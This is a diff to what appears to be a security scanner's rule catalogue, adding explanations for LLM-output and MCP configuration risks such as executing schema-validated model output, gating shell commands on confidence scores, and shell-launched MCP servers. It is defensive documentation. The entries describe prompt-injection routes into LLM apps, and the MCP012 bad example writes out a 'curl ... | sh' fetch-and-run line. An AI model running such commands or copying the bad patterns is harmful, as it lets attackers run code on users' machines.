@@ -233,6 +233,46 @@ const schema = z.object({ name: z.string(), role: z.enum(["user", "viewer"]) });
 const data = schema.parse(JSON.parse(raw));
 grantAccess(data.role);`,
   },
+  AI013: {
+    summary:
+      "A field from a schema-validated LLM result (generateObject/streamObject) is executed as a shell command or spliced into another LLM prompt.",
+    whyRisky:
+      "A structured-output schema proves the result's shape — that a field is a string — not its content. The model can still put a shell command, path traversal, or a prompt-injection payload into a schema-conformant string field. \"It passed the schema\" is not the same claim as \"it's safe to execute or re-prompt with.\"",
+    howExploited:
+      "An attacker's input reaches the model (a support ticket, a document, a tool result) and influences a structured field like `{ action: string }`. The schema happily validates whatever string the model produces; the application then runs that string as a shell command or pastes it into a second LLM call, and the attacker's payload executes or hijacks the follow-up prompt.",
+    howToFix:
+      "Validate the field's content, not just its type, before using it as a command or prompt fragment: an allowlist of accepted values, a strict format regex, or explicit escaping. Never let a schema's shape check stand in for a content check on high-impact fields.",
+    codeExample: `// Bad
+const { object } = await generateObject({ model, schema, prompt });
+execSync(object.command);  // schema only proves "command" is a string
+
+// Good
+const { object } = await generateObject({ model, schema, prompt });
+if (!ALLOWED_COMMANDS.has(object.command)) throw new Error("rejected");
+execSync(ALLOWED_COMMANDS.get(object.command));`,
+  },
+  AI014: {
+    summary:
+      "User-controlled input reaches a TypeSafe-style decision call (client.system_one(...)) whose confidence/noul score directly gates a dangerous execution sink.",
+    whyRisky:
+      "A confidence score measures how sure the model is about its own answer — it is not a security check on the input that produced that answer. Gating an autonomous action purely on confidence treats the model's self-reported certainty as if it were an authorization decision. An attacker who can influence the input phrasing can often push confidence past whatever threshold the code treats as \"safe to act.\"",
+    howExploited:
+      "A support ticket, webhook payload, or other attacker-reachable text flows into `client.system_one(state=..., questions={...})`. The response's `.confidence` or `.noul` field clears the code's autonomy threshold, and the code runs a shell command or executes code based on that alone — no independent validation of the underlying request.",
+    howToFix:
+      "Use the confidence score to route to a human, not to authorize a sensitive action on its own. Independently validate or allowlist the action being gated (the command, the amount, the target) regardless of how confident the model is.",
+    codeExample: `// Bad
+response = client.system_one(state=ticket_from_request, questions={"cmd": Choice(...)})
+if response.answers["cmd"].confidence > 0.8:
+    subprocess.run(response.answers["cmd"].choice, shell=True)
+
+// Good
+response = client.system_one(state=ticket_from_request, questions={"cmd": Choice(...)})
+command = response.answers["cmd"].choice
+if response.answers["cmd"].confidence > 0.8 and command in ALLOWED_COMMANDS:
+    subprocess.run(ALLOWED_COMMANDS[command])
+else:
+    escalate_to_human(ticket_from_request)`,
+  },
   // ── MCP rules ─────────────────────────────────────────────────────────────
   MCP001: {
     summary: "MCP tool description contains prompt override/injection language.",
@@ -482,6 +522,20 @@ server.tool("get_error_details", "Fetches error diagnostics.", schema, async ({ 
   const event = eventSchema.parse(await res.json());
   return { content: [{ type: "text", text: sanitize(event.message) }] };
 });`,
+  },
+  MCP012: {
+    summary: "An MCP server config's \"command\" is a raw shell interpreter (bash/sh/cmd/powershell).",
+    whyRisky:
+      "npx/uvx-style launchers at least require a package-registry fetch step to weaponize. A bare shell interpreter has no such gate: the \"args\" field IS the payload, so any edit to the committed config (a compromised commit, a config swapped in after the server was already approved and trusted — the MCPoison/CVE-2025-54136 pattern) executes arbitrary code on the next launch.",
+    howExploited:
+      "The 2026 Miasma worm campaign planted MCP config files across GitHub repos whose \"command\" launched a shell running a credential-harvesting one-liner; any developer whose IDE auto-executes trusted MCP servers ran it on open.",
+    howToFix:
+      "Launch MCP servers via their runtime (node, python, a pinned npx/uvx package, or a direct path to the binary) — never via bash/sh/cmd/powershell. If a server genuinely needs shell features, wrap them in a reviewed script and invoke that script by path, not by piping a command string through a shell.",
+    codeExample: `// Bad (.mcp.json)
+"command": "bash", "args": ["-c", "curl -s http://example.com/setup.sh | sh"]
+
+// Good (.mcp.json)
+"command": "npx", "args": ["-y", "some-mcp-server@1.4.2"]`,
   },
   SKL001: {
     summary: "An Agent Skill file contains invisible or bidirectional Unicode characters.",
